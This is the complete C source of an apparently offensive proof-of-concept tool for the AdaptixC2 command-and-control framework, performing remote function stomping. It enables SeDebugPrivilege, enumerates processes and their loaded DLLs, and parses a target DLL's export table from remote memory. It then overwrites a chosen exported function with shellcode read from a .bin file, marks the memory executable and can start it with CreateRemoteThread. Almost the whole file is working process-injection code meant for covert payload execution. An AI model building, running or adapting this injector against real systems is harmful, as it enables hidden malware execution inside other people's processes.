/*
 * stomp.c — Remote Function Stomping PoC
 *
 * Part of AdaptixC2 BOF development pipeline (pre-BOF validation).
 *
 *   1. Enumerate running processes (Toolhelp32)
 *   2. User selects target process (by PID or name fragment)
 *   3. Enumerate loaded modules in that process (Toolhelp32)
 *   4. User selects a DLL (by number or name fragment)
 *   5. Read PE export table from target process memory
 *   6. User selects a function to stomp (by number or exact name)
 *   7. File dialog to select shellcode .bin file
 *   8. VirtualProtectEx(RW) → WriteProcessMemory → VirtualProtectEx(RWX)
 *   9. Optional: CreateRemoteThread to trigger execution
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -O2 -Wall stomp.c -o stomp.exe -lcomdlg32 -static
 *
 * Notes:
 *   - Target process should be same architecture as the tool (x64 tool → x64 target).
 *   - Stomping functions in ntdll.dll / kernel32.dll / kernelbase.dll is dangerous
 *     (the OS itself calls these). Prefer obscure, rarely-invoked exports.
 *   - Shellcode size must not exceed the target function's body size, or you
 *     will corrupt adjacent code/data.
 */

#include <windows.h>
#include <tlhelp32.h>
#include <commdlg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>

/* ============================================================
 *  Constants
 * ============================================================ */

#define MAX_PROCS     4096
#define MAX_MODULES   2048
#define MAX_EXPORTS   8192
#define MAX_NAME_LEN  256
#define MAX_SC_SIZE   0x100000  /* sanity cap: 1 MB */

/* ============================================================
 *  Helpers
 * ============================================================ */

static void die(const char *what)
{
    fprintf(stderr, "[!] %s failed: error %lu\n", what, (unsigned long)GetLastError());
    exit(1);
}

/* Case-insensitive substring search (MinGW lacks strcasestr) */
static const char *strcasestr(const char *haystack, const char *needle)
{
    if (!*needle) return haystack;
    size_t nlen = strlen(needle);
    for (; *haystack; haystack++) {
        size_t i;
        for (i = 0; i < nlen; i++) {
            if (tolower((unsigned char)haystack[i]) != tolower((unsigned char)needle[i]))
                break;
        }
        if (i == nlen) return haystack;
    }
    return NULL;
}

/* Read from a remote process. Returns bytes read (0 on failure). */
static SIZE_T xread(HANDLE hProc, DWORD_PTR addr, void *buf, SIZE_T size)
{
    SIZE_T n = 0;
    if (!ReadProcessMemory(hProc, (LPCVOID)addr, buf, size, &n))
        return 0;
    return n;
}

/* ============================================================
 *  Process enumeration
 * ============================================================ */

typedef struct {
    DWORD pid;
    char  name[MAX_PATH];
} proc_entry_t;

static int enumerate_processes(proc_entry_t *out, int max, int *count)
{
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        die("CreateToolhelp32Snapshot(PROCESS)");
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    *count = 0;

    if (Process32First(snap, &pe)) {
        do {
            if (*count >= max) break;
            out[*count].pid = pe.th32ProcessID;
            lstrcpynA(out[*count].name, pe.szExeFile, MAX_PATH);
            (*count)++;
        } while (Process32Next(snap, &pe));
    }

    CloseHandle(snap);
    return *count;
}

/* ============================================================
 *  Module enumeration
 * ============================================================ */

typedef struct {
    DWORD_PTR base;
    DWORD     size;
    char      name[MAX_PATH];
    char      path[MAX_PATH];
} module_entry_t;

static int enumerate_modules(DWORD pid, module_entry_t *out, int max, int *count)
{
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
    if (snap == INVALID_HANDLE_VALUE) {
        die("CreateToolhelp32Snapshot(MODULE)");
    }

    MODULEENTRY32 me;
    me.dwSize = sizeof(me);
    *count = 0;

    if (Module32First(snap, &me)) {
        do {
            if (*count >= max) break;
            out[*count].base = (DWORD_PTR)me.modBaseAddr;
            out[*count].size = me.modBaseSize;
            lstrcpynA(out[*count].name, me.szModule, MAX_PATH);
            lstrcpynA(out[*count].path, me.szExePath, MAX_PATH);
            (*count)++;
        } while (Module32Next(snap, &me));
    }

    CloseHandle(snap);
    return *count;
}

/* ============================================================
 *  PE export table walker (remote)
 *
 *  Reads DOS header → NT headers → Export Directory →
 *  Name/Function/Ordinal arrays, all via ReadProcessMemory.
 *  Architecture-agnostic (detects 32/64-bit via optional header magic).
 * ============================================================ */

typedef struct {
    char       name[MAX_NAME_LEN];
    WORD       ordinal;
    DWORD      rva;
    DWORD_PTR  addr;   /* VA = module_base + rva */
} export_entry_t;

static int read_exports(HANDLE hProc, DWORD_PTR base,
                         export_entry_t *out, int max)
{
    /* --- 1. DOS header --- */
    IMAGE_DOS_HEADER dos;
    if (xread(hProc, base, &dos, sizeof(dos)) != sizeof(dos)) {
        fprintf(stderr, "[!] Failed to read DOS header\n");
        return -1;
    }
    if (dos.e_magic != IMAGE_DOS_SIGNATURE) {
        fprintf(stderr, "[!] Not a valid PE (DOS magic = 0x%04x)\n",
                (unsigned)dos.e_magic);
        return -1;
    }

    /* --- 2. NT headers --- */
    DWORD_PTR nt_addr = base + dos.e_lfanew;
    DWORD sig;
    if (xread(hProc, nt_addr, &sig, 4) != 4 || sig != IMAGE_NT_SIGNATURE) {
        fprintf(stderr, "[!] Not a valid PE (NT signature mismatch)\n");
        return -1;
    }

    /* FileHeader (20 bytes) immediately after Signature */
    IMAGE_FILE_HEADER fhdr;
    if (xread(hProc, nt_addr + 4, &fhdr, sizeof(fhdr)) != sizeof(fhdr)) {
        fprintf(stderr, "[!] Failed to read file header\n");
        return -1;
    }

    /* --- 3. Detect architecture from optional header magic --- */
    WORD opt_magic;
    DWORD_PTR opt_hdr_addr = nt_addr + 4 + sizeof(IMAGE_FILE_HEADER); /* 24 */
    if (xread(hProc, opt_hdr_addr, &opt_magic, 2) != 2) {
        fprintf(stderr, "[!] Failed to read optional header magic\n");
        return -1;
    }

    int is_64 = (opt_magic == 0x20b);
    /* DataDirectory array offset from start of optional header:
     *   32-bit: 96 bytes   (IMAGE_OPTIONAL_HEADER32 layout)
     *   64-bit: 112 bytes  (IMAGE_OPTIONAL_HEADER64 layout)
     */
    int dd_off = is_64 ? 112 : 96;
    DWORD_PTR dd_addr = opt_hdr_addr + dd_off;

    /* --- 4. Export directory entry (index 0) --- */
    IMAGE_DATA_DIRECTORY edd;
    if (xread(hProc, dd_addr, &edd, sizeof(edd)) != sizeof(edd)) {
        fprintf(stderr, "[!] Failed to read data directory\n");
        return -1;
    }
    if (edd.VirtualAddress == 0 || edd.Size == 0) {
        fprintf(stderr, "[!] Module has no export directory\n");
        return 0;
    }

    /* --- 5. IMAGE_EXPORT_DIRECTORY --- */
    IMAGE_EXPORT_DIRECTORY ied;
    DWORD_PTR ied_addr = base + edd.VirtualAddress;
    if (xread(hProc, ied_addr, &ied, sizeof(ied)) != sizeof(ied)) {
        fprintf(stderr, "[!] Failed to read IMAGE_EXPORT_DIRECTORY\n");
        return -1;
    }

    DWORD nfuncs  = ied.NumberOfFunctions;
    DWORD nnames  = ied.NumberOfNames;
    if (nfuncs == 0 || nnames == 0) {
        fprintf(stderr, "[!] Export table is empty\n");
        return 0;
    }

    DWORD nread = (nnames < (DWORD)max) ? nnames : (DWORD)max;

    /* --- 6. Read the three arrays --- */
    DWORD_PTR funcs_addr    = base + ied.AddressOfFunctions;
    DWORD_PTR names_addr    = base + ied.AddressOfNames;
    DWORD_PTR ordinals_addr = base + ied.AddressOfNameOrdinals;

    DWORD *funcs    = (DWORD *)calloc(nfuncs, sizeof(DWORD));
    DWORD *names    = (DWORD *)calloc(nnames, sizeof(DWORD));
    WORD  *ordinals = (WORD  *)calloc(nnames, sizeof(WORD));
    if (!funcs || !names || !ordinals) {
        fprintf(stderr, "[!] Memory allocation failed\n");
        free(funcs); free(names); free(ordinals);
        return -1;
    }

    if (xread(hProc, funcs_addr,    funcs,    nfuncs * sizeof(DWORD)) != nfuncs * sizeof(DWORD)) {
        fprintf(stderr, "[!] Failed to read function RVA array\n");
        free(funcs); free(names); free(ordinals);
        return -1;
    }
    if (xread(hProc, names_addr,    names,    nnames * sizeof(DWORD)) != nnames * sizeof(DWORD)) {
        fprintf(stderr, "[!] Failed to read name RVA array\n");
        free(funcs); free(names); free(ordinals);
        return -1;
    }
    if (xread(hProc, ordinals_addr, ordinals, nnames * sizeof(WORD))  != nnames * sizeof(WORD)) {
        fprintf(stderr, "[!] Failed to read ordinal array\n");
        free(funcs); free(names); free(ordinals);
        return -1;
    }

    /* --- 7. Build export entries --- */
    int count = 0;
    for (DWORD i = 0; i < nread; i++) {
        WORD ord_idx = ordinals[i];
        if (ord_idx >= nfuncs) continue;

        DWORD func_rva = funcs[ord_idx];

        /* Check for forwarded export (RVA points inside export directory) */
        if (func_rva >= edd.VirtualAddress &&
            func_rva <  edd.VirtualAddress + edd.Size)
        {
            char fwd[MAX_NAME_LEN] = {0};
            xread(hProc, base + func_rva, fwd, MAX_NAME_LEN - 1);
            snprintf(out[count].name, MAX_NAME_LEN, "(fwd:%s)", fwd);
        }
        else
        {
            char namebuf[MAX_NAME_LEN] = {0};
            if (xread(hProc, base + names[i], namebuf, MAX_NAME_LEN - 1) == 0) {
                free(funcs); free(names); free(ordinals);
                return -1;
            }
            lstrcpynA(out[count].name, namebuf, MAX_NAME_LEN);
        }

        out[count].ordinal = ord_idx;
        out[count].rva     = func_rva;
        out[count].addr    = base + func_rva;
        count++;
    }

    free(funcs);
    free(names);
    free(ordinals);
    return count;
}

/* ============================================================
 *  Shellcode file dialog
 * ============================================================ */

static int pick_shellcode_file(char *path_out, int path_max)
{
    OPENFILENAMEA ofn;
    ZeroMemory(&ofn, sizeof(ofn));
    ofn.lStructSize  = sizeof(ofn);
    ofn.hwndOwner    = NULL;
    ofn.lpstrFilter  = "Shellcode (*.bin)\0*.bin\0All files (*.*)\0*.*\0";
    ofn.nFilterIndex = 1;
    ofn.lpstrFile    = path_out;
    ofn.nMaxFile     = path_max;
    ofn.Flags        = OFN_FILEMUSTEXIST | OFN_PATHMUSTEXIST;

    if (!GetOpenFileNameA(&ofn))
        return 0;
    return 1;
}

/* ============================================================
 *  Shellcode file loader
 * ============================================================ */

static unsigned char *load_shellcode(const char *path, DWORD *out_size)
{
    FILE *fp = fopen(path, "rb");
    if (!fp) {
        fprintf(stderr, "[!] Cannot open '%s'\n", path);
        return NULL;
    }

    fseek(fp, 0, SEEK_END);
    long sz = ftell(fp);
    fseek(fp, 0, SEEK_SET);

    if (sz <= 0 || sz > MAX_SC_SIZE) {
        fprintf(stderr, "[!] Invalid shellcode size: %ld (cap %d)\n",
                sz, MAX_SC_SIZE);
        fclose(fp);
        return NULL;
    }

    unsigned char *buf = (unsigned char *)malloc(sz);
    if (!buf) {
        fprintf(stderr, "[!] Cannot allocate %ld bytes\n", sz);
        fclose(fp);
        return NULL;
    }

    size_t rd = fread(buf, 1, sz, fp);
    fclose(fp);
    if (rd != (size_t)sz) {
        fprintf(stderr, "[!] Short read: %zu of %ld\n", rd, sz);
        free(buf);
        return NULL;
    }

    *out_size = (DWORD)sz;
    return buf;
}

/* ============================================================
 *  Critical-module warning
 * ============================================================ */

static void warn_critical_module(const char *mod_name)
{
    static const char *critical[] = {
        "ntdll.dll", "kernel32.dll", "kernelbase.dll", "hal.dll", NULL
    };
    for (int i = 0; critical[i]; i++) {
        if (strcasestr(mod_name, critical[i])) {
            fprintf(stderr,
                "\n[!!] WARNING: %s is a critical system module.\n"
                "    Stomping its exports can crash the OS or destabilize\n"
                "    all processes. Proceed with extreme caution.\n\n",
                mod_name);
            break;
        }
    }
}

/* ============================================================
 *  Main
 * ============================================================ */

/* Enable SeDebugPrivilege so we can access service/SYSTEM processes. */
static void enable_debug_privilege(void)
{
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        fprintf(stderr, "[!] OpenProcessToken: %lu (run as admin?)\n",
                (unsigned long)GetLastError());
        return;
    }

    if (!LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &luid)) {
        fprintf(stderr, "[!] LookupPrivilegeValue(SeDebugPrivilege): %lu\n",
                (unsigned long)GetLastError());
        CloseHandle(hToken);
        return;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL)) {
        fprintf(stderr, "[!] AdjustTokenPrivileges: %lu (not elevated?)\n",
                (unsigned long)GetLastError());
        CloseHandle(hToken);
        return;
    }

    DWORD err = GetLastError();
    if (err == ERROR_NOT_ALL_ASSIGNED) {
        fprintf(stderr, "[!] SeDebugPrivilege not granted (need admin elevation)\n");
    } else {
        printf("[+] SeDebugPrivilege enabled\n");
    }

    CloseHandle(hToken);
}

int main(void)
{
    printf("========================================\n");
    printf("  AdaptixC2 — Remote Function Stomping\n");
    printf("  Standalone PoC (pre-BOF validation)\n");
    printf("========================================\n\n");

    enable_debug_privilege();

    /* --------------------------------------------------------
     *  Step 1: Process selection
     * -------------------------------------------------------- */
    proc_entry_t *procs = (proc_entry_t *)calloc(MAX_PROCS, sizeof(proc_entry_t));
    if (!procs) { fprintf(stderr, "[!] calloc procs\n"); return 1; }
    int nprocs = 0;

    printf("[*] Enumerating running processes...\n");
    nprocs = enumerate_processes(procs, MAX_PROCS, &nprocs);
    printf("[+] Found %d processes\n\n", nprocs);

    printf("  PID       Name\n");
    printf("  --------   ----------------------------------\n");
    for (int i = 0; i < nprocs; i++) {
        printf("  %-8lu   %s\n", (unsigned long)procs[i].pid, procs[i].name);
    }

    printf("\n[*] Target PID or name fragment: ");
    char input[MAX_NAME_LEN];
    if (!fgets(input, sizeof(input), stdin)) return 1;
    input[strcspn(input, "\r\n")] = 0;

    DWORD  target_pid  = 0;
    char   target_name[MAX_PATH] = {0};
    char   *endptr;
    unsigned long val = strtoul(input, &endptr, 10);

    if (*endptr == '\0' && val > 0) {
        /* Interpret as PID */
        for (int i = 0; i < nprocs; i++) {
            if (procs[i].pid == (DWORD)val) {
                target_pid = procs[i].pid;
                lstrcpynA(target_name, procs[i].name, MAX_PATH);
                break;
            }
        }
        if (!target_pid) {
            fprintf(stderr, "[!] No process with PID %lu\n", val);
            return 1;
        }
    } else {
        /* Interpret as name fragment (case-insensitive) */
        int found = 0;
        for (int i = 0; i < nprocs; i++) {
            if (strcasestr(procs[i].name, input)) {
                target_pid = procs[i].pid;
                lstrcpynA(target_name, procs[i].name, MAX_PATH);
                found++;
                if (found == 1) break;  /* use first match */
            }
        }
        if (!target_pid) {
            fprintf(stderr, "[!] No process matching '%s'\n", input);
            return 1;
        }
        if (found > 1)
            printf("[*] Multiple matches — using PID %lu (%s)\n",
                   (unsigned long)target_pid, target_name);
    }

    printf("[+] Target: %s  (PID %lu)\n\n", target_name, (unsigned long)target_pid);

    /* --------------------------------------------------------
     *  Step 2: Module selection
     * -------------------------------------------------------- */
    module_entry_t *mods = (module_entry_t *)calloc(MAX_MODULES, sizeof(module_entry_t));
    if (!mods) { fprintf(stderr, "[!] calloc mods\n"); free(procs); return 1; }
    int nmods = 0;

    printf("[*] Enumerating modules in PID %lu...\n", (unsigned long)target_pid);
    nmods = enumerate_modules(target_pid, mods, MAX_MODULES, &nmods);
    printf("[+] Found %d modules\n\n", nmods);

    printf("  #    Base           Size        Name\n");
    printf("  --   --------------  --------    ----------------------------------\n");
    for (int i = 0; i < nmods; i++) {
        printf("  %-3d  0x%012lx   %9lu     %s\n",
               i + 1,
               (unsigned long)mods[i].base,
               (unsigned long)mods[i].size,
               mods[i].name);
    }

    printf("\n[*] Module # (1-%d) or name fragment: ", nmods);
    if (!fgets(input, sizeof(input), stdin)) return 1;
    input[strcspn(input, "\r\n")] = 0;

    DWORD_PTR mod_base = 0;
    char mod_name[MAX_PATH] = {0};

    endptr = NULL;
    unsigned long mnum = strtoul(input, &endptr, 10);
    if (*endptr == '\0' && mnum >= 1 && mnum <= (unsigned long)nmods) {
        mod_base = mods[mnum - 1].base;
        lstrcpynA(mod_name, mods[mnum - 1].name, MAX_PATH);
    } else {
        for (int i = 0; i < nmods; i++) {
            if (strcasestr(mods[i].name, input)) {
                mod_base = mods[i].base;
                lstrcpynA(mod_name, mods[i].name, MAX_PATH);
                break;
            }
        }
        if (!mod_base) {
            fprintf(stderr, "[!] No module matching '%s'\n", input);
            return 1;
        }
    }

    printf("[+] Module: %s  (base 0x%lx)\n\n", mod_name, (unsigned long)mod_base);
    warn_critical_module(mod_name);

    /* --------------------------------------------------------
     *  Step 3: Open process, read export table
     * -------------------------------------------------------- */
    HANDLE hProc = OpenProcess(
        PROCESS_VM_READ | PROCESS_VM_WRITE |
        PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION,
        FALSE, target_pid);
    if (!hProc) die("OpenProcess");

    export_entry_t *exports = (export_entry_t *)calloc(MAX_EXPORTS, sizeof(export_entry_t));
    if (!exports) { fprintf(stderr, "[!] calloc exports\n"); free(procs); free(mods); return 1; }
    int nexports = 0;

    printf("[*] Reading PE export table from target process...\n");
    nexports = read_exports(hProc, mod_base, exports, MAX_EXPORTS);
    if (nexports < 0) {
        CloseHandle(hProc);
        return 1;
    }
    if (nexports == 0) {
        fprintf(stderr, "[!] No exported functions found\n");
        CloseHandle(hProc);
        return 1;
    }
    printf("[+] Found %d exported functions\n\n", nexports);

    int show = nexports < 300 ? nexports : 200;
    printf("  #    Ordinal   RVA          Address          Name\n");
    printf("  --   --------  ------------ ---------------  ----------------------------------\n");
    for (int i = 0; i < show; i++) {
        printf("  %-4d %-8lu  0x%08lx      0x%012lx     %s\n",
               i + 1,
               (unsigned long)exports[i].ordinal,
               (unsigned long)exports[i].rva,
               (unsigned long)exports[i].addr,
               exports[i].name);
    }
    if (nexports > 200)
        printf("  ... (%d more — type exact name to select)\n", nexports - 200);

    printf("\n[*] Function # (1-%d) or exact name to stomp: ", nexports);
    if (!fgets(input, sizeof(input), stdin)) { CloseHandle(hProc); return 1; }
    input[strcspn(input, "\r\n")] = 0;

    DWORD_PTR stomp_addr = 0;
    char stomp_name[MAX_NAME_LEN] = {0};

    endptr = NULL;
    unsigned long fnum = strtoul(input, &endptr, 10);
    if (*endptr == '\0' && fnum >= 1 && fnum <= (unsigned long)nexports) {
        stomp_addr = exports[fnum - 1].addr;
        lstrcpynA(stomp_name, exports[fnum - 1].name, MAX_NAME_LEN);
    } else {
        /* Try exact match, then case-insensitive */
        for (int i = 0; i < nexports; i++) {
            if (strcmp(exports[i].name, input) == 0) {
                stomp_addr = exports[i].addr;
                lstrcpynA(stomp_name, exports[i].name, MAX_NAME_LEN);
                break;
            }
        }
        if (!stomp_addr) {
            for (int i = 0; i < nexports; i++) {
                if (_stricmp(exports[i].name, input) == 0) {
                    stomp_addr = exports[i].addr;
                    lstrcpynA(stomp_name, exports[i].name, MAX_NAME_LEN);
                    break;
                }
            }
        }
        if (!stomp_addr) {
            fprintf(stderr, "[!] Function '%s' not found in export table\n", input);
            CloseHandle(hProc);
            return 1;
        }
    }

    printf("[+] Stomp target: %s  @ 0x%lx\n", stomp_name, (unsigned long)stomp_addr);

    /* --------------------------------------------------------
     *  Step 4: Shellcode file selection (dialog)
     * -------------------------------------------------------- */
    char sc_path[MAX_PATH] = {0};
    printf("\n[*] Selecting shellcode .bin file (dialog)...");
    fflush(stdout);

    if (!pick_shellcode_file(sc_path, MAX_PATH)) {
        printf(" cancelled.\n");
        CloseHandle(hProc);
        return 0;
    }
    printf("\n[+] Shellcode file: %s\n", sc_path);

    DWORD sc_size = 0;
    unsigned char *shellcode = load_shellcode(sc_path, &sc_size);
    if (!shellcode) {
        CloseHandle(hProc);
        return 1;
    }
    printf("[+] Shellcode loaded: %lu bytes\n", (unsigned long)sc_size);

    /* --------------------------------------------------------
     *  Step 5: Stomp (VirtualProtectEx → WriteProcessMemory → VirtualProtectEx)
     * -------------------------------------------------------- */
    printf("\n[*] Stomping '%s' at 0x%lx (%lu bytes)...\n",
           stomp_name, (unsigned long)stomp_addr, (unsigned long)sc_size);

    DWORD old_prot = 0;

    /* 5a. RW */
    if (!VirtualProtectEx(hProc, (LPVOID)stomp_addr, sc_size,
                          PAGE_READWRITE, &old_prot))
    {
        die("VirtualProtectEx (RW)");
    }
    printf("[+]   VirtualProtectEx RW  : OK  (prev protect = 0x%lx)\n",
           (unsigned long)old_prot);

    /* 5b. Write */
    SIZE_T written = 0;
    if (!WriteProcessMemory(hProc, (LPVOID)stomp_addr, shellcode,
                            sc_size, &written))
    {
        die("WriteProcessMemory");
    }
    printf("[+]   WriteProcessMemory   : OK  (%lu bytes)\n", (unsigned long)written);

    /* 5c. RX (or RWX) */
    DWORD old_prot2 = 0;
    if (!VirtualProtectEx(hProc, (LPVOID)stomp_addr, sc_size,
                          PAGE_EXECUTE_READWRITE, &old_prot2))
    {
        die("VirtualProtectEx (RX)");
    }
    printf("[+]   VirtualProtectEx RX  : OK\n");

    /* --------------------------------------------------------
     *  Step 6: Optional remote thread execution
     * -------------------------------------------------------- */
    printf("\n[*] Trigger remote thread at stomped address? [y/N]: ");
    char yn[8];
    if (fgets(yn, sizeof(yn), stdin)) {
        yn[strcspn(yn, "\r\n")] = 0;
        if (yn[0] == 'y' || yn[0] == 'Y') {

            HANDLE hThread = CreateRemoteThread(hProc, NULL, 0,
                                                 (LPTHREAD_START_ROUTINE)stomp_addr,
                                                 NULL, 0, NULL);
            if (!hThread) {
                die("CreateRemoteThread");
            }
            printf("[+]   Remote thread created  : handle 0x%p\n",
                   (void *)hThread);

            printf("[*]   Waiting for thread (10s timeout)...");
            DWORD w = WaitForSingleObject(hThread, 10000);
            if (w == WAIT_OBJECT_0) {
                DWORD ec = 0;
                GetExitCodeThread(hThread, &ec);
                printf("\n[+]   Thread finished  : exit code 0x%lx\n",
                       (unsigned long)ec);
            } else {
                printf("\n[!]   Thread still running after 10s (shellcode may\n"
                       "      be in a loop / network callback).\n");
            }
            CloseHandle(hThread);
        } else {
            printf("[*]   Skipped (stomp complete, no execution).\n");
        }
    }

    /* --------------------------------------------------------
     *  Summary
     * -------------------------------------------------------- */
    printf("\n========================================\n");
    printf("  Stomp complete.\n");
    printf("========================================\n");
    printf("  Process : %s  (PID %lu)\n", target_name, (unsigned long)target_pid);
    printf("  Module  : %s  (base 0x%lx)\n", mod_name, (unsigned long)mod_base);
    printf("  Function: %s  (addr 0x%lx)\n", stomp_name, (unsigned long)stomp_addr);
    printf("  Payload : %lu bytes  (%s)\n", (unsigned long)sc_size, sc_path);
    printf("========================================\n");

    free(shellcode);
    free(procs);
    free(mods);
    free(exports);
    CloseHandle(hProc);
    return 0;
}
